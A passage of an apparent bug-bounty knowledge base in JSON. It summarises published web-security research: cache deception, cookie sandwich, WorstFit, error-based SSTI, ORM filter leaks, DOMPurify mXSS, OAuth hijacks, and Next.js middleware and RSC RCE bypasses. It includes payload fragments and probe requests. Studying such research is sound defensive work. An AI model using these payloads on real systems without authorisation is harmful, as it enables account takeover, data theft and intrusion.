+   "keywords": [
+    "%3f truncation after regex match",
+    "mod_rewrite url view vs filesystem",
+    "documentroot confusion",
+    "handler confusion via content_type",
+    "<files> vs php-fpm sethandler proxy:",
+    "allowencodedslashes on",
+    "shared request_rec"
+   ],
+   "lesson": "parser-differential"
+  },
+  {
+   "id": "rs-06",
+   "source_url": "https://portswigger.net/research/gotta-cache-em-all",
+   "set": "research",
+   "severity": "high",
+   "bounty": null,
+   "classes": [
+    "cache-poison",
+    "parser-differential"
+   ],
+   "first_signal": "`X-Cache: hit`, a response-time delta, and `Cache-Control: public` versus `no-store`; CloudFront/Azure/Imperva normalize before applying cache rules while Cloudflare/GCP/Fastly do not; IIS treats an encoded backslash as a slash and no tested CDN does",
+   "mechanic": "Origin-only path delimiters (`;` in Spring, `.` in Rails, `%00` in OpenLiteSpeed, `%0a` in nginx) plus normalization gaps give both web cache deception and arbitrary cache poisoning through key normalization (\"Cache-What-Where\").",
+   "chain": [
+    "Establish a non-cacheable baseline R0",
+    "`/homeabcd` differs; `/home$abcd` matching R0 proves `$` is an origin delimiter",
+    "Compare `GET /home/index?cacheBuster` against `/aaa/../home/index?cacheBuster` to see who normalizes",
+    "Intruder over all ASCII raw and encoded; the cache buster is the safety mechanism"
+   ],
+   "impact_proof": "Token and API-key theft leading to account takeover, defacement and malicious JS on popular cache keys. No named target or bounty.",
+   "keywords": [
+    "origin-only path delimiter",
+    ";  spring . rails %00 openlitespeed %0a nginx",
+    "cache-what-where",
+    "cache key normalization",
+    "cache buster as the safety mechanism",
+    "encoded backslash on iis"
+   ],
+   "lesson": "parser-differential"
+  },
+  {
+   "id": "rs-07",
+   "source_url": "https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html",
+   "set": "research",
+   "severity": "high",
+   "bounty": "$6,500",
+   "classes": [
+    "cache-poison",
+    "auth-bypass",
+    "parser-differential"
+   ],
+   "first_signal": "A shared-link path with no static extension; `Cf-Cache-Status: HIT`; a nonexistent path under `/share/` is also cached",
+   "mechanic": "A cache rule keyed on the path prefix `/share/*` plus a CDN that does not decode `%2F..%2F` while the origin does lets a sensitive endpoint be cached under the wildcard.",
+   "chain": [
+    "`GET /share/random-nonexistent` and check for a HIT",
+    "`/share/%2F..%2Fapi/auth/session?cachebuster=<unique>` against your own session, the unique buster guaranteeing no other user's entry is touched",
+    "Retrieve the cached session response"
+   ],
+   "impact_proof": "The victim's `/api/auth/session` token cached and retrieved by the attacker, giving full account takeover including chats and billing.",
+   "keywords": [
+    "wildcard cache rule /share/*",
+    "%2f..%2f not decoded by the cdn",
+    "cf-cache-status: hit",
+    "/api/auth/session",
+    "unique cache buster for safety",
+    "web cache deception"
+   ],
+   "lesson": "parser-differential"
+  },
+  {
+   "id": "rs-08",
+   "source_url": "https://slcyber.io/assetnote-security-research-center/",
+   "set": "research",
+   "severity": "critical",
+   "bounty": null,
+   "classes": [
+    "auth-bypass",
+    "parser-differential"
+   ],
+   "first_signal": "nginx in front of Apache in front of PHP, each with a different path view",
+   "mechanic": "Front-end nginx versus Apache versus PHP path views give pre-auth access to PAN-OS management endpoints (CVE-2025-0108).",
+   "chain": [
+    "Identify the nginx/Apache/PHP chain",
+    "Craft a path the front end and the back end read differently",
+    "Reach a management endpoint pre-auth"
+   ],
+   "impact_proof": "Not verified in detail in this pass; the direct post URL did not resolve, so the research-center index is cited. Flagged as a lead.",
+   "keywords": [
+    "nginx vs apache path view",
+    "pan-os auth bypass",
+    "cve-2025-0108",
+    "pre-auth management endpoint",
+    "path confusion chain"
+   ],
+   "lesson": "parser-differential"
+  },
+  {
+   "id": "rs-09",
+   "source_url": "https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique",
+   "set": "research",
+   "severity": "high",
+   "bounty": null,
+   "classes": [
+    "parser-differential",
+    "info-leak",
+    "xss"
+   ],
+   "first_signal": "Any endpoint reflecting a cookie value into the body or into `Set-Cookie` (analytics and visitor-ID endpoints are the archetype); Tomcat 8.5/9.0/10.0 which default to RFC2109; Flask returning `\\073` for the swallowed `;`",
+   "mechanic": "JavaScript sets `$Version=1`, `param1=\"start` and `param2=end\"`, so the server switches to RFC2109 quoted-string parsing and swallows the cookies in between - HttpOnly included - into one reflected value.",
+   "chain": [
+    "Use your own dummy cookies only, with `$Version` first and a longer Path such as `Path=/json`",
+    "Check whether the reflected value swallows the intervening pairs instead of returning just `start`",
+    "Chain a WAF-bypassing reflected XSS plus a credentialed-CORS Tomcat subdomain reflector to read the HttpOnly cookie"
+   ],
+   "impact_proof": "Read the HttpOnly `PHPSESSID` through the chained reflector.",
+   "keywords": [
+    "cookie sandwich",
+    "$version=1",
+    "rfc2109 quoted-string parsing",
+    "httponly swallowed into one value",
+    "cookie path precedence",
+    "analytics reflector endpoint"
+   ],
+   "lesson": "parser-differential"
+  },
+  {
+   "id": "rs-10",
+   "source_url": "https://portswigger.net/research/splitting-the-email-atom",
+   "set": "research",
+   "severity": "high",
+   "bounty": null,
+   "classes": [
+    "auth-bypass",
+    "parser-differential"
+   ],
+   "first_signal": "Domain-restricted registration or verification; `RCPT TO` in a Collaborator SMTP capture showing the DECODED form; Ruby Mail gem or PHP IDN stacks; Sendmail 8.15.2 behaving differently from Postfix 3.6.4",
+   "mechanic": "Encoded-word (`=?utf-8?q?..?=`), UUCP `!` and `%`-hack source routes, malformed punycode (`xn--0117` yielding `@`) and unicode overflow (mod-256, PHP `chr()`) make the validator and the mailer disagree about the destination domain.",
+   "chain": [
+    "Register or change the email to `=?utf-8?q?=61=62=63?=<collab-id>@<own-collab-domain>`",
+    "Read the SMTP envelope to see which domain the MTA resolved",
+    "Method: Probe, Observe, Encode and Exploit (Hackvertor tags, Turbo Intruder script, punycode fuzzer)"
+   ],
+   "impact_proof": "GitHub verified addresses at microsoft.com, mozilla.com and github.com (leading to a Cloudflare Zero Trust domain-rule bypass); Zendesk and GitLab domain-restriction bypass; Joomla punycode `<style>` injection into CSS-import CSRF-token leak into RCE (CVE-2024-21725).",
+   "keywords": [
+    "encoded-word =?utf-8?q?",
+    "uucp ! and % source route",
+    "malformed punycode xn--0117",
+    "unicode overflow mod-256",
+    "rcpt to envelope shows the decoded form",
+    "domain-restricted registration"
+   ],
+   "lesson": "parser-differential"
+  },
+  {
+   "id": "rs-11",
+   "source_url": "https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/",
+   "set": "research",
+   "severity": "critical",
+   "bounty": null,
+   "classes": [
+    "rce",
+    "lfi",
+    "parser-differential"
+   ],
+   "first_signal": "A Windows host and its ACP (`...\\Nls\\CodePage /v ACP`); narrow APIs (`GetCommandLineA`, `getenv`, `FindFirstFileA`, plain `int main()`); an app spawning CLI tools (wget/tar/openssl/java/curl) from PHP `escapeshellarg`, Python `list2cmdline` or Node; CGI passing `QUERY_STRING`/`PATH_INFO`; Python below 3.6",
+   "mechanic": "Windows Best-Fit conversion from UTF-16 to ANSI happens AFTER escaping and validation, re-introducing `\"`, `\\`, `/` and `-`.",
+   "chain": [
+    "Send fullwidth `＂` U+FF02 (becomes `\"` on 125x/874), `＼` U+FF3C, `¥` on cp932, `／` U+FF0F for traversal, soft hyphen `%AD` becoming `-` on cp932/936/950",
+    "Use the file-existence oracle `/index.php/..¥..¥windows/win.ini/` versus `..¥..¥NONEXIST/` where \"No input file specified\" means the path exists",
+    "Escalate to argument injection, traversal or RCE through the spawned tool"
+   ],
+   "impact_proof": "CVE-2024-4577 (PHP-CGI RCE), elFinder via tar `--use-compress-program`, openssl `-engine` loading a remote DLL, RStudio CVE-2024-45720, Perforce CVE-2024-8067, Excel CVE-2024-49026 into NTLM relay into RCE, Cuckoo traversal into Flask PIN into RCE.",
+   "keywords": [
+    "best-fit conversion after escaping",
+    "fullwidth u+ff02 u+ff3c u+ff0f",
+    "soft hyphen %ad becomes -",
+    "escapeshellarg bypass",
+    "no input file specified existence oracle",
+    "narrow windows api"
+   ],
+   "lesson": "parser-differential"
+  },
+  {
+   "id": "rs-12",
+   "source_url": "https://slcyber.io/research-center/abusing-windows-net-quirks-and-unicode-normalization-to-exploit-dnn-dotnetnuke/",
+   "set": "research",
+   "severity": "high",
+   "bounty": null,
+   "classes": [
+    "info-leak",
+    "parser-differential",
+    "file-upload"
+   ],
+   "first_signal": "DNN 6.0.0 to below 10.0.1 with `FileUploader.ashx`; generally any .NET app doing `Path.Combine` or `File.Exists` on a user-supplied name",
+   "mechanic": "`%EF%BC%8E` (U+FF0E) and `%EF%BC%BC` (U+FF3C) are normalized to `.` and `\\` AFTER the security checks, so the filename becomes a UNC path and `File.Exists` on it leaks NTLM.",
+   "chain": [
+    "POST a crafted filename containing fullwidth characters",
+    "Normalization after validation turns it into a UNC path",
+    "Observe the inbound SMB connection to your own Responder-style listener (OOB, check program policy first)"
+   ],
+   "impact_proof": "Pre-auth NTLM hash disclosure, CVSS 8.6, GHSA-mgfv-2362-jq96. The article has a \"hunting variants\" section.",
+   "keywords": [
+    "u+ff0e u+ff3c normalization",
+    "validation pre-normalization",
+    "unc path from a filename",
+    "file.exists leaks ntlm",
+    "path.combine",
+    "fileuploader.ashx"
+   ],
+   "lesson": "parser-differential"
+  },
+  {
+   "id": "rs-13",
+   "source_url": "https://www.youtube.com/watch?v=ETB2w-f3pM4",
+   "set": "research",
+   "severity": "unknown",
+   "bounty": null,
+   "classes": [
+    "parser-differential"
+   ],
+   "first_signal": null,
+   "mechanic": "A broad unicode-normalization exploit corpus drawn from WAF-vendor telemetry, with ActiveScan++ updates shipped; the same signal and test shape as WorstFit and the DNN case.",
+   "chain": [
+    "Fingerprint where normalization happens relative to validation",
+    "Send characters that normalize into the dangerous form afterwards"
+   ],
+   "impact_proof": "Not stated; ranked #4 of 2025. Shipped as ActiveScan++ updates.",
+   "keywords": [
+    "unicode normalization corpus",
+    "waf vendor telemetry",
+    "activescan++ updates",
+    "normalize after validate"
+   ],
+   "lesson": "parser-differential"
+  },
+  {
+   "id": "rs-14",
+   "source_url": "https://www.youtube.com/watch?v=Dq_KVLXzxH8",
+   "set": "research",
+   "severity": "unknown",
+   "bounty": null,
+   "classes": [
+    "parser-differential"
+   ],
+   "first_signal": null,
+   "mechanic": "Cross-language and cross-framework parser-differential case studies, presented as a hunting lens rather than a payload list.",
+   "chain": [
+    "Pick a string format consumed by two different parsers",
+    "Find the input the two read differently"
+   ],
+   "impact_proof": "Not stated; ranked #10 of 2025; the panel called it \"an excellent starting point\" for research ideas.",
+   "keywords": [
+    "parser differentials as a lens",
+    "cross-language case studies",
+    "interpretation as the vulnerability",
+    "two parsers one string"
+   ],
+   "lesson": "parser-differential"
+  },
+  {
+   "id": "rs-15",
+   "source_url": "https://github.com/vladko312/Research_Successful_Errors",
+   "set": "research",
+   "severity": "high",
+   "bounty": null,
+   "classes": [
+    "ssti",
+    "rce",
+    "other"
+   ],
+   "first_signal": "`(1/0).zxy.zxy` errors in any supported language and the error text identifies it; the blind pairs `(3*4/2)` versus `3*)2(/4` and `((7*8)/(2*4))` versus `7)(*)8)(2/(*4` where a response difference proves evaluation without running a command; polyglot `${{<%[%'\"}}%\\.`",
+   "mechanic": "Error-based SSTI forces an error whose message echoes attacker data or command output, and boolean error-based blind raises an error only when a condition is false, so no time delay is needed.",
+   "chain": [
+    "Send the polyglot, then `(1/0).zxy.zxy` to identify the language from the error text",
+    "Send the arithmetic pairs, keeping true and false payloads minimally different to exclude WAF and proxy noise",
+    "Use the per-language error sink: Python `getattr(\"\", OUTPUT)` or `{% include OUTPUT %}`, PHP `call_user_func(OUTPUT)`, SpEL `Integer.valueOf(OUTPUT)`, OGNL `OUTPUT/0`, Freemarker `?new()`, Ruby `File.read(OUTPUT)`, Node `require(OUTPUT)`, Elixir `[1,2][OUTPUT]`, prefixing output with `Y:/A:/` so it can never accidentally resolve and suppress the error",
+    "Baseline comparison over status, length, word and line counts, headers, cookies, redirects, final URL, Content-Type and Server, stable within 5%, discarding the first request"
+   ],
+   "impact_proof": "Output recovery on previously blind sinks: expr-eval (CVE-2025-13204), JSONPath Plus (CVE-2025-1302), Twig sandbox CVE-2022-23614, Dust.JS. Toolkit SSTImap 1.3.0 or newer.",
+   "keywords": [
+    "error-based ssti",
+    "(1/0).zxy.zxy",
+    "arithmetic pairs oracle",
+    "boolean error instead of sleep",
+    "y:/a:/ output prefix",
+    "per-language error sink",
+    "5% stability baseline"
+   ],
+   "lesson": "oracle"
+  },
+  {
+   "id": "rs-16",
+   "source_url": "https://www.elttam.com/blog/leaking-more-than-you-joined-for/",
+   "set": "research",
+   "severity": "critical",
+   "bounty": null,
+   "classes": [
+    "filter-injection",
+    "info-leak",
+    "sqli"
+   ],
+   "first_signal": "Filter params naming both a field AND an operator (`q=email=~elttam.com`); keys containing `__` (Django/Beego relational traversal `created_by__user__username__contains`); list/search endpoints accepting arbitrary field names; OData `/$metadata` plus `$filter`/`$expand`; endpoints accepting a nested object where a string is expected (`resetToken[not]=E` via `express.urlencoded({extended:true})`, `j:`-prefixed JSON cookies)",
+   "mechanic": "A user-controlled filter field and operator reach the ORM, giving a boolean, error or timing oracle over fields that are never meant to be searchable, such as password, salt and token.",
+   "chain": [
+    "Filter on a harmless field for a baseline",
+    "Add an unexpected field or operator, or send an object where a string is expected",
+    "Observe the change in result count, length, error or timing; collation matters because MySQL/MariaDB/SQLite/MSSQL are case-insensitive by default"
+   ],
+   "impact_proof": "Harbor password hashes plus salts (CVE-2025-30086, with two patch bypasses: `email__password__startswith`, then the `=~` fuzzy syntax appending `__icontains`); Prisma reset-token bypass into ATO; Directus CVE-2025-64748; EF dynamic-LINQ and OData full token leak. Tools: `plormber` for timing, elttam semgrep rules.",
+   "keywords": [
+    "field and operator from the client",
+    "__ relational traversal",
+    "email__password__startswith",
+    "=~ fuzzy operator",
+    "resettoken[not]=e",
+    "object-for-string",
+    "result count oracle"
+   ],
+   "lesson": "filter-operator"
+  },
+  {
+   "id": "rs-17",
+   "source_url": "https://media.defcon.org/DEF%20CON%2032/DEF%20CON%2032%20presentations/DEF%20CON%2032%20-%20Paul%20Gerste%20-%20SQL%20Injection%20Isn%27t%20Dead%20Smuggling%20Queries%20at%20the%20Protocol%20Level.pdf",
+   "set": "research",
+   "severity": "high",
+   "bounty": null,
+   "classes": [
+    "sqli",
+    "parser-differential"
+   ],
+   "first_signal": "Driver and version: pgx v5.5.3 (CVE-2024-27304), sqlx (RUSTSEC-2024-0363); MongoDB also discussed; application paths accepting very large parameter values",
+   "mechanic": "Database wire protocols are TLV, and integer truncation of a size field lets a whole statement be smuggled past prepared statements.",
+   "chain": [
+    "Fingerprint the driver and version",
+    "Reproduce locally (PoC github.com/roaris/CVE-2024-27304-PoC)",
+    "Live exploitation needs multiple roughly 2GB queries plus knowledge of the surrounding query, so treat this as version-driven rather than probe-driven"
+   ],
+   "impact_proof": "Arbitrary statement injection that bypasses parameterization.",
+   "keywords": [
+    "tlv wire protocol",
+    "size field integer truncation",
+    "prepared statements bypassed",
+    "pgx v5.5.3",
+    "2gb parameter value",
+    "version-driven not probe-driven"
+   ],
+   "lesson": "parser-differential"
+  },
+  {
+   "id": "rs-18",
+   "source_url": "https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes",
+   "set": "research",
+   "severity": "high",
+   "bounty": null,
+   "classes": [
+    "xss",
+    "parser-differential"
+   ],
+   "first_signal": "DOMPurify 3.1.2 or earlier with the default config (SVG and MathML allowed by default); output re-parsed after sanitize (`innerHTML` re-assignment, a double `sanitize()` as in older Mermaid, or a server-side pre-parse); a Chromium or Safari victim, since most variants do not work in Firefox",
+   "mechanic": "mXSS through node flattening above 512 depth, namespace and integration-point confusion (svg/math `<style>`, `mi`, `mtext`, `desc`, `foreignObject`), nested `<caption>` stack popping, the `<button>`/`<image>` elevator, second-order DOM clobbering of `__depth`, and triple parsing.",
+   "chain": [
+    "Fingerprint the DOMPurify version",
+    "In an isolated copy, check whether sanitized output changes structurally after one extra `DOMParser` round-trip with a harmless marker",
+    "PoCs use `alert(1)` only"
+   ],
+   "impact_proof": "Full XSS in the default configuration, surviving sanitize-twice patterns. After 3.1.3 the security \"rests heavily on a single regular expression\".",
+   "keywords": [
+    "mxss node flattening 512 depth",
+    "namespace confusion foreignobject",
+    "nested caption stack popping",
+    "dom clobbering __depth",
+    "sanitize twice is worse",
+    "extra domparser round-trip",
+    "libxml2 255 depth"
+   ],
+   "lesson": "parser-differential"
+  },
+  {
+   "id": "rs-19",
+   "source_url": "https://evil.blog/2024/12/doubleclickjacking-what.html",
+   "set": "research",
+   "severity": "high",
+   "bounty": null,
+   "classes": [
+    "csrf",
+    "auth-bypass",
+    "other"
+   ],
+   "first_signal": "A sensitive action reachable by top-level navigation with attacker-chosen parameters (OAuth authorize, account settings); a single-click confirm with a predictable button position; buttons live immediately on load with no gesture gating",
+   "mechanic": "A `window.open` decoy, `window.opener.location` navigating the parent tab to a sensitive page, and the decoy closing on `mousedown` so the second click lands on the real button.",
+   "chain": [
+    "Open the decoy with `window.open`",
+    "Navigate the parent tab with `window.opener.location` to the target action",
+    "Close the decoy on `mousedown` so the second click of a double-click lands on the real button"
+   ],
+   "impact_proof": "Account takeover demonstrated on Salesforce and Slack; claimed on \"almost every site that supports OAuth\", crypto wallets and extensions. X-Frame-Options, CSP frame-ancestors and SameSite Lax/Strict are all irrelevant because the target loads top-level in the victim's session.",
+   "keywords": [
+    "window.opener.location",
+    "decoy closes on mousedown",
+    "no framing needed",
+    "top-level navigation in the victim session",
+    "button position predictable",
+    "disable buttons until mousemove"
+   ],
+   "lesson": "other"
+  },
+  {
+   "id": "rs-20",
+   "source_url": "https://blog.doyensec.com/2024/07/02/cspt2csrf.html",
+   "set": "research",
+   "severity": "high",
+   "bounty": null,
+   "classes": [
+    "cspt",
+    "csrf",
+    "file-upload"
+   ],
+   "first_signal": "A user-controlled value (fragment, query, path parameter or stored data) appearing as a path SEGMENT in front-end API URLs; sinks keep the original method, headers and body, so every finding is described as a source-sink pair",
+   "mechanic": "The front end puts user input into an API request path, so `../` reroutes the application's own authenticated request, giving a CSRF that survives SameSite.",
+   "chain": [
+    "Insert traversal into a candidate source and watch in the proxy whether the outgoing API path changes (Burp extension github.com/doyensec/CSPTBurpExtension, Bambda filter, semgrep rules, Eval Villain)",
+    "Record the source-sink pair with its method, header and body constraints",
+    "Chain a GET sink plus a file upload or download gadget hosting crafted JSON (a `%PDF` header within the first 1024 bytes still parses as JSON for mmmagic; WebP/JSON polyglots) into a state-changing POST"
+   ],
+   "impact_proof": "Mattermost, Rocket.Chat and others; JSONP-to-XSS and CSPT-to-XSS variants collected in the resources post.",
+   "keywords": [
+    "client-side path traversal",
+    "user input as a path segment",
+    "source-sink pair",
+    "samesite survived",
+    "upload gadget hosting json",
+    "%pdf within the first 1024 bytes",
+    "get sink into state-changing post"
+   ],
+   "lesson": "composition"
+  },
+  {
+   "id": "rs-21",
+   "source_url": "https://labs.snyk.io/resources/hijacking-oauth-flows-via-cookie-tossing/",
+   "set": "research",
+   "severity": "high",
+   "bounty": null,
+   "classes": [
+    "oauth",
+    "csrf",
+    "auth-bypass"
+   ],
+   "first_signal": "Subdomains hosting user content or any subdomain XSS (self-XSS is enough); a cookie-based session WITHOUT the `__Host-` prefix; state-changing JSON endpoints relying on a CORS preflight with no CSRF token; multi-step connect or payment flows. SameSite is irrelevant because a subdomain is same-site.",
+   "mechanic": "A subdomain sets a `Domain=.target` session cookie scoped to a narrow Path (`/api/authorize`, `/auth/<idp>/callback`), and path precedence makes those endpoints run under the attacker's session while everything else looks normal.",
+   "chain": [
+    "Two own accounts plus your own subdomain",
+    "Set a parent-domain cookie with a narrow Path",
+    "Verify that the endpoint acts under the planted session while other pages keep the real one",
+    "The victim's OAuth link lands on the attacker's account"
+   ],
+   "impact_proof": "Gitpod CVE-2024-21583: the victim's Bitbucket/GitHub account linked to the attacker's account, giving repo access, source edit and commits.",
+   "keywords": [
+    "cookie tossing",
+    "domain=.target narrow path",
+    "cookie path precedence",
+    "missing __host- prefix",
+    "self-xss is enough",
+    "identity link lands on attacker account"
+   ],
+   "lesson": "composition"
+  },
+  {
+   "id": "rs-22",
+   "source_url": "https://blog.voorivex.team/oauth-non-happy-path-to-ato",
+   "set": "research",
+   "severity": "high",
+   "bounty": "~$3,000",
+   "classes": [
+    "oauth",
+    "open-redirect",
+    "auth-bypass"
+   ],
+   "first_signal": "Callback error handling that redirects based on `Referer`; a behaviour change when callback parameters are stripped; a token appearing in the fragment after changing `response_type`; providers accepting a multi-value `response_type` or `prompt=none`; no interactive final step",
+   "mechanic": "Forcing the callback's error branch (`response_type=id_token`) makes the app redirect to whatever `Referer` holds, and 3xx chains preserve the URL fragment and the original `window.open` opener as Referer, so the token or code leaks to the attacker origin.",
+   "chain": [
+    "With your own account, strip or alter callback parameters and record the redirect target",
+    "Swap `response_type`; `response_type=code,id_token` (Google accepts comma-separated) returns the usable code too",
+    "Open the flow via `window.open` from your own page and read the Referer the callback sees; `prompt=none` removes the account picker so nothing interactive breaks the chain"
+   ],
+   "impact_proof": "Full account takeover via a stolen `code` plus `state`; about $3,000, with CVSS reduced to roughly 7.7 because not all users link Google.",
+   "keywords": [
+    "callback error branch",
+    "referer-based redirect",
+    "response_type=code,id_token",
+    "prompt=none",
+    "fragment preserved across 3xx",
+    "window.open opener as referer"
+   ],
+   "lesson": "composition"
+  },
+  {
+   "id": "rs-23",
+   "source_url": "https://blog.babelo.xyz/posts/cross-site-subdomain-leak/ and https://blog.arkark.dev/2025/12/26/etag-length-leak",
+   "set": "research",
+   "severity": "low",
+   "bounty": null,
+   "classes": [
+    "info-leak",
+    "cors"
+   ],
+   "first_signal": "Cross-origin responses whose size or host differs by authentication state",
+   "mechanic": "Two XS-leak oracles: Chrome connection-pool prioritisation leaks a cross-domain redirect's hostname, and chained edge cases leak a cross-origin response's size through ETag length.",
+   "chain": [
+    "Pick a cross-origin response whose size or host varies with auth state",
+    "Measure it with the connection-pool priority oracle, or with the ETag length oracle"
+   ],
+   "impact_proof": "Low direct bounty value, high value as oracles; the panel rated the ETag length leak more versatile and harder to patch than the redirect leak.",
+   "keywords": [
+    "connection-pool prioritisation oracle",
+    "cross-origin redirect hostname leak",
+    "etag length leak",
+    "response size as an oracle",
+    "auth-state dependent size"
+   ],
+   "lesson": "oracle"
+  },
+  {
+   "id": "rs-24",
+   "source_url": "https://zhero-web-sec.github.io/research-and-things/nextjs-cache-and-chains-the-stale-elixir",
+   "set": "research",
+   "severity": "critical",
+   "bounty": "six figures across fintech, crypto and e-commerce programs",
+   "classes": [
+    "cache-poison",
+    "xss"
+   ],
+   "first_signal": "Next.js 13.5.1 to 14.2.9, pages router, non-dynamic SSR routes, NOT on Vercel; the buildId visible in `__NEXT_DATA__`; the tell is Cache-Control flipping from `private, no-cache, no-store, max-age=0, must-revalidate` to `s-maxage=1, stale-while-revalidate` when the header is added",
+   "mechanic": "An external `x-now-route-matches` makes Next.js treat an SSR response as SSG, so the framework's own cache stores it with `s-maxage=1, stale-while-revalidate`; combined with a data request (`__nextDataReq`, `/_next/data/{buildID}/page.json`, `x-nextjs-data`) the JSON gets cached under the HTML URL.",
+   "chain": [
+    "Add `x-now-route-matches` to a non-dynamic SSR route and require the Cache-Control flip",
+    "Pair it with a data request so JSON is cached under the HTML URL",
+    "Use an unimportant endpoint only: cache busters barely work because the poisoned cache is internal; for the external-cache variant drop `Accept-Encoding` if it is in the cache key, since browsers always send it so real users are unaffected"
+   ],
+   "impact_proof": "Denial of service (SSR page replaced by JSON), stored XSS from any reflected request value (UA, locale, cookie, Host), and cache deception of victim PII. CVE-2024-46982 plus CVE-2025-32421 race bypass.",
+   "keywords": [
+    "x-now-route-matches",
+    "ssr treated as ssg",
+    "s-maxage=1, stale-while-revalidate",
+    "__nextdatareq",
+    "/_next/data/{buildid}/page.json",
+    "internal framework cache",
+    "drop accept-encoding"
+   ],
+   "lesson": "framework-internals"
+  },
+  {
+   "id": "rs-25",
+   "source_url": "https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware",
+   "set": "research",
+   "severity": "critical",
+   "bounty": null,
+   "classes": [
+    "auth-bypass",
+    "missing_authorization"
+   ],
+   "first_signal": "Self-hosted Next.js (Vercel and Netlify are protected); a middleware-gated path with an `x-middleware-rewrite`, `-next` or `-redirect` response header, or a Location containing `unauthorized`, and status not 200; CSP or cookies set by middleware",
+   "mechanic": "The `x-middleware-subrequest` recursion guard, sent externally, skips middleware entirely (CVE-2025-29927, CVSS 9.1).",
+   "chain": [
+    "Request the gated path with and without the header and compare",
+    "Payload by version: `pages/_middleware` below 12.2; `middleware` or `src/middleware` on 12.2 and later; the name repeated at least 5 times colon-separated on 13.2 and later",
+    "The redirect or rewrite disappears and the CSP header vanishes; avoid CDN-fronted paths because a 404 can get cached (CPDoS)"
+   ],
+   "impact_proof": "Authorization bypass (15.1.7), CSP bypass (15.0.3) and cache-poisoning DoS. All versions from 11.1.4 up to the patches 15.2.3 / 14.2.25 / 13.5.9 / 12.3.5.",
+   "keywords": [
+    "x-middleware-subrequest",
+    "recursion guard exposed externally",
+    "middleware:middleware repeated 5x",
+    "x-middleware-rewrite response header",
+    "self-hosted only",
+    "csp header vanishes"
+   ],
+   "lesson": "framework-internals"
+  },
+  {
+   "id": "rs-26",
+   "source_url": "https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass",
+   "set": "research",
+   "severity": "critical",
+   "bounty": null,
+   "classes": [
+    "auth-bypass"
+   ],
+   "first_signal": "`_next/static` in the body or \"Next.js\" in the headers, then internal `href` paths regex-extracted from the page",
+   "mechanic": "A reusable three-request detection flow for CVE-2025-29927: fingerprint, baseline for middleware involvement, then require a blocked-to-200 transition.",
+   "chain": [
+    "Fingerprint `_next/static` in the body or \"Next.js\" in headers and regex-extract internal `href` paths",
+    "Baseline: keep only paths showing middleware involvement (`x-middleware-rewrite`/`-next`/`-redirect`, or a Location containing `unauthorized`) AND status not 200",
+    "Exploit: resend with both 5x payloads and require the transition blocked to 200"
+   ],
+   "impact_proof": "Template shipped about 24 hours after disclosure. The author states version detection is a HINT and active before/after verification is PROOF, and notes that status-200-only is a weak signal where body or length comparison would be stronger.",
+   "keywords": [
+    "fingerprint then baseline then transition",
+    "version detection is a hint",
+    "before/after verification is proof",
+    "status-200-only is weak",
+    "regex-extract internal href paths"
+   ],
+   "lesson": "oracle"
+  },
+  {
+   "id": "rs-27",
+   "source_url": "https://www.slcyber.io/research/high-fidelity-detection-mechanism-for-rsc-next-js-rce-cve-2025-55182-cve-2025-66478",
+   "set": "research",
+   "severity": "critical",
+   "bounty": null,
+   "classes": [
+    "rce"
+   ],
+   "first_signal": "`POST /` with `Next-Action: x` plus router and request-id headers, multipart field `\"1\"` = `{}` and field `\"0\"` = `[\"$1:a:a\"]`; vulnerable means HTTP 500 whose body contains `E{\"digest\"`",
+   "mechanic": "Pre-auth RCE in React Server Components in the default configuration; `getOutlinedModel` splits on `:` and walks `{}.a.a`, which throws, while patched versions require an object plus `hasOwnProperty` so no 500 occurs.",
+   "chain": [
+    "Send the probe: `POST /` with `Next-Action: x` and the two multipart fields",
+    "Require HTTP 500 with `E{\"digest\"` in the body",
+    "Note the caveats: a digest error without THIS payload does not count, the probe can over-flag outside the affected version range, and WAFs often block the full RCE payload but not this probe"
+   ],
+   "impact_proof": "Pre-auth RCE; scanner github.com/assetnote/react2shell-scanner.",
+   "keywords": [
+    "next-action: x probe",
+    "[\"$1:a:a\"]",
+    "e{\"digest\" 500 body",
+    "getoutlinedmodel splits on :",
+    "hasownproperty patch behaviour",
+    "detector passes wafs the exploit does not"
+   ],
+   "lesson": "oracle"
+  },
+  {
+   "id": "rs-28",
+   "source_url": "https://www.assetnote.io/resources/research/how-an-obscure-php-footgun-led-to-rce-in-craft-cms",
+   "set": "research",
+   "severity": "critical",
+   "bounty": null,
+   "classes": [
+    "rce"
+   ],
+   "first_signal": "Craft CMS with the default PHP ini, where the query string is treated as argv",
+   "mechanic": "`register_argc_argv=On` (the PHP default, and on in Craft's official Docker image) makes PHP build argv FROM THE QUERY STRING, space-separated, giving CLI argument injection and a Twig template load over the FTP wrapper for pre-auth RCE.",
+   "chain": [
+    "Confirm `register_argc_argv=On` and that the query string becomes argv",
+    "Inject CLI arguments through the query string",
+    "Load a Twig template over the FTP wrapper for pre-auth RCE"
+   ],
+   "impact_proof": "Pre-auth RCE, CVE-2024-56145; CISA KEV 2025-06-02; a nuclei template exists.",
+   "keywords": [
+    "register_argc_argv=on",
+    "query string becomes argv",
+    "cli argument injection",
+    "twig template via ftp wrapper",
+    "config footgun",
+    "default docker image"
+   ],
+   "lesson": "framework-internals"
+  },
+  {
+   "id": "rs-29",
+   "source_url": "https://watchtowr.com/wp-content/uploads/SOAPwnwatchtowr_soappwn-research-whitepaper_10-12-2025.pdf",
+   "set": "research",
+   "severity": "critical",
+   "bounty": null,
+   "classes": [
+    "rce",
+    "deserialization"
+   ],
+   "first_signal": "A Microsoft-wontfix `HttpWebClientProtocol` flaw, then the question of which products import it",
+   "mechanic": "Sink-centric framework research: grow one unfixed .NET primitive into an RCE sink across multiple products - find one unfixed primitive, then enumerate its importers.",
+   "chain": [
+    "Identify an unfixed framework primitive (`HttpWebClientProtocol`, wontfix)",
+    "Enumerate the products that import it",
+    "Reach an RCE sink in each"
+   ],
+   "impact_proof": "RCE sink reached across multiple .NET products; ranked #5 of 2025.",
+   "keywords": [
+    "httpwebclientprotocol",
+    "wontfix primitive",
+    "enumerate importers across products",
+    "wsdl http client proxy",
+    "sink-centric research",
+    ".net framework"
+   ],
+   "lesson": "framework-internals"
+  },
+  {
+   "id": "rs-30",
